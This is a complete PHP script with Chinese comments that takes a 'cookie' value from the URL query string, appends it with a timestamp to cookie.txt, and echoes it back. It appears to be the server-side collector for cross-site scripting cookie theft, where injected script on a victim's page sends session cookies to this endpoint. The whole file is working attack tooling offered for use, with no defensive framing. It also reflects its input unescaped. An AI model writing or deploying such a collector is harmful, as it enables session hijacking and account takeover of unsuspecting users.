<?php
// 设置响应头
header('Content-Type: text/plain');

// 获取 cookie 参数
$cookieValue = isset($_GET['cookie']) ? $_GET['cookie'] : '';

// 检查是否提供了 cookie 参数
if (empty($cookieValue)) {
    echo "Error: No cookie parameter provided\n";
    echo "Usage: script.php?cookie=your_cookie_value_here";
    exit;
}

// 定义文件路径（确保 web 服务器有写入权限）
$filename = 'cookie.txt';

// 追加写入文件，加上时间戳
$line = date('Y-m-d H:i:s') . " | " . $cookieValue . "\n";

// 写入文件
if (file_put_contents($filename, $line, FILE_APPEND | LOCK_EX)) {
    echo "Success: Cookie saved to {$filename}\n";
    echo "Content: {$cookieValue}\n";
} else {
    echo "Error: Failed to write to {$filename}\n";
    echo "Check directory permissions";
}
?>